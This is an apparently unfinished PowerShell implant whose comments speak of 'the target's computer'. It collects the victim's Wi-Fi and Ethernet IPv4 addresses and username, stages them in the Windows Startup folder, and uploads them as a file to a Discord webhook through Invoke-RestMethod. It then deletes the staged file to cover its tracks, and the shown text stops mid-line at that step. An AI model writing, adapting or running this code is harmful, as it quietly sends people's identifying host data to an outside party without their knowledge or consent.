# Get IPv4 address for WiFi adapter
$WiFiAdapterName = "Wi-Fi"
$WiFiIPv4 = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq $WiFiAdapterName -and $_.AddressFamily -eq "IPv4" }).IPAddress

# Get IPv4 address for Ethernet adapter
$EthernetAdapterName = "Ethernet"
$EthernetIPv4 = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq $EthernetAdapterName -and $_.AddressFamily -eq "IPv4" }).IPAddress

# Display the IPv4 addresses
Write-Host "WiFi IPv4 Address: $WiFiIPv4"
Write-Host "Ethernet IPv4 Address: $EthernetIPv4"

# None of the files created will be saved on the target's computer
# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead

# Get the Wi-Fi IPv4 Address
$IPAddress = (Get-NetIPAddress -InterfaceAlias "Wi-Fi" | Where-Object {$_.AddressFamily -eq "IPv4"}).IPAddress
# Get the current user's username
$Username = $env:USERNAME

# Get the user's profile folder
$UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# Define the path to the file containing the Discord webhook URL
$DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL.icu"
# Use Get-Content to read the file and store its content in a variable
$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile

# Create a text file in the user's startup folder
$TextContent = "Wi-Fi IPv4 Address: $WiFiIPv4`nEthernet IPv4 Address: $EthernetIPv4`nUsername: $Username"
$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
$TextContent | Out-File -FilePath $TextFile

# Define a message (commented out for now)
# $Message = "Message Placeholder"

# Create a multipart form-data payload
$Boundary = [System.Guid]::NewGuid().ToString()
$CRLF = "`r`n"
$Payload = "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"content`"$CRLF$CRLF$Message$CRLF" +
    "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$Username.txt`"$CRLF" +
    "Content-Type: application/octet-stream$CRLF$CRLF" +
    (Get-Content -Path $TextFile) + $CRLF +
    "--$Boundary--"
# Set the headers for the request
$Headers = @{
    "Content-Type" = "multipart/form-data; boundary=$Boundary"
}

# Send the payload to Discord
Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload

# Delete the text file
Remove-Item -Path $TextFil